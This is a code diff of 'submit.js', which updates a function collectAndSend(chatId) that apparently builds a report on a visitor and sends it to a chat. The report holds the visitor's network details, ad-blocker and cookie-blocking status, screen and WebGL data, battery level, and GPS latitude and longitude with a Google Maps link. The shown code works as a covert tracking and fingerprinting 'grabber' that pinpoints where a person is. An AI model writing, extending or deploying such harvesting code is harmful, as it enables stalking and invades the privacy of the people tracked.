@@ -1,4 +1,4 @@
-// submit.js (updated: IP section format + GPS map link)
+// submit.js (updated: Network type + Adblock cookies + headings)
 
 async function collectAndSend(chatId) {
   if (!chatId) {
@@ -62,13 +62,16 @@ async function collectAndSend(chatId) {
 
   // Network info
   const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
-  const netType = connection ? (connection.effectiveType || 'Unknown') : 'Unknown';
+  const netType = connection ? (connection.type || connection.effectiveType || 'Unknown') : 'Unknown';
   const downlink = connection ? (connection.downlink ? connection.downlink + ' Mbps' : 'Unknown') : 'Unknown';
   const rtt = connection ? (connection.rtt ? Math.round(connection.rtt) + ' ms' : 'Unknown') : 'Unknown';
   const saveData = connection ? (connection.saveData ? 'Enabled' : 'Disabled') : 'Unknown';
 
   // Adblock detection
   async function detectAdblock() {
+    let method = '';
+    let detected = 'Negative';
+    // DOM bait
     try {
       const bait = document.createElement('div');
       bait.className = 'adsbox ad-banner adsbygoogle adunit';
@@ -77,17 +80,32 @@ async function collectAndSend(chatId) {
       await new Promise(r => setTimeout(r, 60));
       const isHidden = (bait.offsetParent === null || bait.offsetHeight === 0 || bait.clientHeight === 0 || getComputedStyle(bait).display === 'none');
       bait.remove();
-      if (isHidden) return 'Positive';
+      if (isHidden) { detected = 'Positive'; method = 'DOM'; }
     } catch {}
-    try {
-      const controller = new AbortController();
-      const timeout = setTimeout(() => controller.abort(), 2500);
-      await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'GET', mode: 'no-cors', signal: controller.signal });
-      clearTimeout(timeout);
-      return 'Negative';
-    } catch {
-      return 'Positive';
+
+    // Network fetch
+    if (detected === 'Negative') {
+      try {
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), 2500);
+        await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'GET', mode: 'no-cors', signal: controller.signal });
+        clearTimeout(timeout);
+        method = 'None';
+      } catch {
+        detected = 'Positive';
+        method = 'Network';
+      }
     }
+
+    // Cookie test
+    let cookiesBlocked = 'No';
+    try {
+      document.cookie = "abctest=1";
+      if (!document.cookie.includes("abctest")) cookiesBlocked = 'Yes';
+      document.cookie = "abctest=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
+    } catch { cookiesBlocked = 'Yes'; }
+
+    return { detected, method, cookiesBlocked };
   }
 
   // Geolocation
@@ -143,8 +161,8 @@ async function collectAndSend(chatId) {
 - Screen: ${resolution}, ${colorDepth}
 - WebGL: ${webglRenderer} (${webglVendor})
 
-📶 Network:
-- Type: ${netType}
+📶 Network Info:
+- Connection Type: ${netType}
 - Speed: ${downlink}
 - Latency: ${rtt}
 - Data Saver: ${saveData}
@@ -163,7 +181,10 @@ async function collectAndSend(chatId) {
 - Longitude: ${geoResult.longitude}
 - Map View: https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}
 
-🛡️ Adblocker: ${adblockResult}
+🛡️ Adblock Info:
+- Blocker Detected: ${adblockResult.detected}
+- Method: ${adblockResult.method}
+- Cookies Blocked: ${adblockResult.cookiesBlocked}
 
 🔋 Battery:
 - Level: ${batteryLevel}
